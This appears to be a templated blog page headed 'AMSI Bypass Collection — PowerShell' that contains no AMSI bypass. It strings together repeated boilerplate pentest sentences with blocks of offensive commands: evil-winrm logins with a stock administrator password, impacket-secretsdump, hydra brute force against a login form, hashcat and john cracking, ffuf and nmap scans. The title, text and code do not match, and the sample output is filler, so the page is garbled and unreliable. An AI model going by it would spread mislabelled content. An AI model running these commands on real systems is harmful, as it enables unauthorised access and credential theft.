---
TitleSEO: "AMSI Bypass Collection in PowerShell | ZureFX"
TitlePost: "AMSI Bypass Collection — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for amsi bypass collection. Built for security research and automation."
Keywords: "script, c, python, bash, powershell"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-473.html"
URL_IMAGES: ""
Date: "2024-12-20"
Tags: "Script, C, Python, Bash, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-473"
Permalink: "/scripting/script-amsi-bypass-collection-473.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `burpsuite`
- `smbexec`
- `ldapsearch`

## Implementation

### Core Logic

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
evil-winrm -i 10.52.217.48 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

```powershell
evil-winrm -i 10.47.206.206 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.115.214.29 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.66.113.24
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.14.88.109/FUZZ
nmap -sCV -p25,445,464 10.110.57.247 -oN scan.txt
```

### Advanced Options

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.114.5.197/FUZZ
evil-winrm -i 10.56.138.152 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 1.40s
```
